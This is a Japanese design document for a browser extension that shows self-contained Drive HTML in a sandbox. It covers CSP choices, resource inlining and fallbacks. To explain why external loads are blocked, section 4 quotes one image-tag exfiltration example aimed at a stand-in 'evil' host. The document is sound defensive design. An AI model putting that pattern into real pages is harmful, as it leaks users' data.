# SANDBOX_PREVIEW - 自己完結 HTML のサンドボックス表示

インライン `<script>` / `onclick` / `eval` を含む HTML を動かすため、**外部参照を持たない（1 ファイルで完結する）HTML はサンドボックス文脈で表示する**。複数ファイル構成（相対パスで CSS/JS/画像を参照）は従来どおり Service Worker（仮想サーバー）で解決する。第一段階の対応。

> 背景・他案との比較は `SECURITY.md`（3.5）を参照。拡張ページの CSP（`script-src 'self' 'wasm-unsafe-eval'`）はインライン JS を実行できず、緩和もできない。一方サンドボックスページは別 CSP（`'unsafe-inline' 'unsafe-eval'` 可）だが、不透明オリジンのため SW が相対パスを横取り解決できない。両立しないので「構成で出し分ける」。

## 1. 出し分けの判定

エントリ HTML（ナビゲーション要求 = `request.mode === "navigate"`）を SW が取得した時点で、本文に **SW での解決が必要な相対サブリソース参照**があるかを判定する（`lib/html-analyze.ts` の `hasRelativeSubresource`）。

| 構成 | 表示方法 | インライン JS |
|------|---------|--------------|
| 相対サブリソース参照が**無い**（1 ファイル完結） | サンドボックス表示 | 動く |
| 相対サブリソース参照が**ある** | 従来どおり拡張ページ（SW が相対解決） | 動かない（従来制約） |

### 「相対サブリソース参照」の定義

次のタグ/構文の URL 値が**相対パス**（スキーム無し・`//` 無し・`#` 始まりでない・`data:`/`blob:` でない）であるものを 1 つでも含めば「あり」とみなす：

- `<link href>`（`<a href>` は対象外＝ナビゲーションでありサブリソースではない）
- `<script src>` / `<img src>` / `<iframe src>` / `<source src>` / `<video src>` / `<audio src>` / `<embed src>` / `<object data>`
- CSS の `url(...)` と `@import`（`<style>` / `style=` 属性内）

絶対 URL（`https://…` の CDN 等）や `data:` はサブリソース解決を要しないため「相対参照」にはカウントしない。

## 2. サンドボックス表示の仕組み（MV3 標準手順）

`srcdoc` 直挿しは親（拡張ページ）の CSP を継承して動かないため使わない。**manifest の `sandbox.pages` に登録した固定ページ**を iframe で読み、`postMessage` で HTML 文字列を渡して描画する。

1. SW がエントリ要求に対し、**ホストページ HTML** を生成して返す（`chrome-extension://<id>/preview/<sessionId>/<entry>`）。ホストページは拡張オリジンの普通の拡張ページ。中身は:
   - 元の Drive HTML を `<script type="application/json" id="dwp-doc">`（`<` を `<` にして安全に埋め込み）
   - `<iframe src="<sandbox.html の絶対 URL>">`（`sandbox.html` は `preview/` 配下を避け、SW にインターセプトされない位置に置く）
   - `<script src="<assets/preview-host.js の絶対 URL>">`（`'self'` の外部スクリプト＝拡張 CSP で OK）
2. `preview-host.js` が埋め込み HTML を読み、iframe ロード後に `postMessage({ type: "dwp_render", html })` を送る
3. `sandbox.html`（manifest sandbox 登録＝緩い CSP）の受信スクリプトが `document.open()/write(html)/close()` で描画 → インライン `<script>`・`onclick`・`eval` が動く

```
[Drive HTML]
   │ SW: navigate かつ HTML かつ 相対参照なし
   ▼
[ホストページ(拡張ページ)] --iframe src--> [sandbox.html(緩いCSP)]
   │ doc を JSON 埋め込み                       ▲
   └── preview-host.js が postMessage(html) ────┘ document.write で描画
```

## 3. manifest 設定

```jsonc
"sandbox": { "pages": ["sandbox.html"] },
"content_security_policy": {
  "sandbox": "sandbox allow-scripts allow-modals; default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; style-src 'unsafe-inline'; img-src data: blob:; font-src data: blob:; media-src data: blob:; connect-src 'none';"
}
```

CSP は privacy-first 方針（「通信先は Google API のみ」）に合わせ、**`default-src 'none'` を基準に必要最小限だけ開ける**:

- `script-src 'unsafe-inline' 'unsafe-eval'` … インライン `<script>` / `onclick` / `eval` を実行（サンドボックス対象は外部参照なし HTML なので外部 `src` は不要＝`'self'` も付けない）
- `style-src 'unsafe-inline'` … インライン `<style>` / `style=` 属性
- `img-src` / `font-src` / `media-src` を `data:`/`blob:` のみ許可（自己完結ページが埋め込む data URI 資産）
- **`connect-src 'none'`** … プレビュー対象の `fetch`/XHR/WebSocket 等による**外部通信を遮断**（方針との齟齬を防ぐ）
- iframe sandbox トークンは `allow-scripts`（JS 実行）と `allow-modals`（`alert` 等）のみ。**`allow-forms`/`allow-popups` は付けない**（外部エンドポイントへのフォーム送信・`window.open` 外部遷移を防ぐ）

その他:

- `sandbox.html` は dist 直下に出力（`preview/` 配下に置くと SW がインターセプトしてしまう）
- `preview-host.js` は `assets/` 配下（同じく `preview/` を避ける。ホストページ＝拡張ページ側で `'self'` 外部スクリプトとして読む）
- 拡張ページ内の iframe から同拡張の `sandbox.html` を読むため `web_accessible_resources` への追加は不要

## 3.5 第二段階：複数ファイル構成＋インライン JS（全インライン化）

相対サブリソース参照を持つ HTML でも、**参照リソースを SW 側で取得して HTML に全インライン化**し、その結果が「自己完結 HTML」になればサンドボックス表示してインライン JS を動かす（`lib/inline-resources.ts`）。

### インライン化の対象と方法

| 参照 | 変換 |
|------|------|
| `<link rel="stylesheet" href>` | CSS を取得し、その中の `url()` / `@import` も再帰解決して `<style>…</style>` に展開 |
| その他の `<link href>`（icon 等） | `href` を data URI に置換 |
| `<script src>`（非 module） | JS を取得して `<script>…</script>` に展開 |
| `<img/source/video/audio/embed src>` `<object data>` | バイナリを取得して `data:` URI に置換 |
| インライン CSS（`<style>` / `style=`）の `url()` | data URI に置換 |

- 相対パスの基準は「その参照を含むファイルの位置」。HTML は エントリの位置、CSS 内 `url()` はその CSS の位置を基準に `path-resolver.normalize` で解決する。
- 取得は SW の `resolvePathCached`（メモ化）＋`getMediaRaw` を `ResourceFetcher` として渡す。
- 累積サイズに上限を設け、超過時はインライン化を中断して従来表示へフォールバックする。

### 判定とフォールバック

1. エントリ HTML に相対参照あり → インライン化を試みる
2. インライン化後に相対参照が**残っていない**（完全に取り込めた）→ サンドボックス表示（インライン JS 動く）
3. 取得失敗や **ESM（`<script type="module">`）** が残る → まだ相対参照ありと判定 → **従来表示（拡張ページ）にフォールバック**（リソースは SW が解決して表示される。インライン JS は動かないが破綻しない）

ESM はインライン化しても内部の `import './x'` が不透明オリジンで解決できないため、あえてインライン化せず残す（＝フォールバック）。実行時 `fetch('./x')` も同様に対象外。

## 4. この段階の制約（既知）

- サンドボックス内は不透明オリジンかつ `connect-src 'none'` のため、実行時の `fetch`/XHR による外部通信は不可（privacy-first 方針により意図的に遮断している）。
- **外部 CDN（`<script src="https://…">` 等）は意図的に非対応**。sandbox CSP は `data:`/`blob:` 以外の外部読み込みを許さない。これはセキュリティ判断であり、`https:` を許すと CDN は動くようになる一方、`<img src="https://evil/?d=…">` のような **GET によるデータ流出（exfiltration）経路**が開く（`connect-src 'none'` では防げない）。流出経路をゼロにするため CDN は許可しない（詳細・他案比較は `SECURITY.md` 3.5）。CDN を参照するページはその部分のみ動かない（ローカル資産＋インライン JS は動く）。
- **ESM（`<script type="module">`）と実行時 `fetch('./x')`** は救えない。前者は不透明オリジンで `import` が解決できず、後者は静的解析で追えないため。これらを含むページは従来表示にフォールバックする。
- **`srcset` はインライン化しない**。data URI がカンマを含み srcset のカンマ区切り構文と衝突するため安全に書き換えできない。相対 `srcset` を持つページは `hasRelativeSubresource` が検知して従来表示にフォールバックする。
- `allow-forms`/`allow-popups` を付けていないため、フォームの外部送信や `window.open` での外部遷移は動かない（プレビュー用途では不要かつ安全側の判断）。
- **巨大な自己完結 HTML はサンドボックス化しない**。全文バッファ＋複製＋ホストページ生成で SW のメモリを圧迫するため、`Content-Length` が大ファイル閾値（`LARGE_FILE_THRESHOLD`）超なら従来表示にフォールバックする（その場合インライン JS は動かない）。
- 外部参照の検出は正規表現ベースの割り切り（DOMParser が SW に無いため）。無クオート属性（`<img src=logo.png>`）は対応済みだが、極端に変則的な記法は誤判定し得る。誤判定が「相対参照なし」側に倒れるとサンドボックス化され不透明オリジンで相対 src が解決できず**描画が崩れる**可能性がある（頻度は低い）。
- サンドボックスは `chrome.*` 不可・拡張 API から隔離（セキュリティ上はむしろ望ましい）。

## 5. セキュリティ

- サンドボックスは拡張 API・トークン・拡張ストレージ・Cookie へアクセスできない（不透明オリジン＋`allow-same-origin` なし）。「トークンを外部に渡さない」コア方針は守られる。
- さらに `connect-src 'none'` でプレビュー対象 JS の外部通信自体を遮断し、「通信先は Google API のみ」方針との齟齬を無くす。`allow-forms`/`allow-popups` も外しフォーム外部送信・外部遷移を防ぐ。
- `postMessage` は自ページ間のみ。受信側は `type` を検証する。
- 元 HTML の JSON 埋め込みは `<` をエスケープし、`</script>` による早期終了・注入を防ぐ。

## 6. テスト

- `lib/html-analyze.ts` は純関数のためユニットテスト（`test/html-analyze.test.ts`）。相対参照あり/なしの判定を網羅。
- 実際のインライン JS 実行・サンドボックス CSP 適合は実ブラウザが必要（`samples/01-single-inline` で確認）。

## 7. 関連

`SECURITY.md`（3.5） / `SERVICE_WORKER.md` / `CONTENT_TYPE.md` / `ARCHITECTURE.md`
